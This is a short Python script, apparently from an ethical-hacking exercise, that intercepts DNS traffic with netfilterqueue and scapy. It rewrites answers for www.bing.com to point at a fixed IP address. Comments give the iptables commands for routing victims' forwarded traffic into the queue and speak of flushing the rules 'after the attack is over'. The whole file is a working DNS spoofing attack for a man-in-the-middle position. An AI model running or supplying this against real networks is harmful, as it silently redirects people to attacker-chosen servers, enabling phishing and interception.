import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        print(f"[*] DNS Request: {qname}")  # Debugging
        if b"www.bing.com" in qname:  
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="163.70.143.174")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

          
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum  

           
            packet.set_payload(bytes(scapy_packet))
    
    packet.accept()

queue = netfilterqueue.NetfilterQueue() 
queue.bind(0, process_packet)
queue.run()



#  IPtables commands to redirect the DNS traffic to the queue (remote access):

#  sudo iptables -I FORWARD -j NFQUEUE --queue-num 0

#for internal testing . 

#sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
#sudo iptables -I INPUT -j NFQUEUE --queue-num 0


#After the attack is over dont forget to flush the ip tables 
#iptables --flush

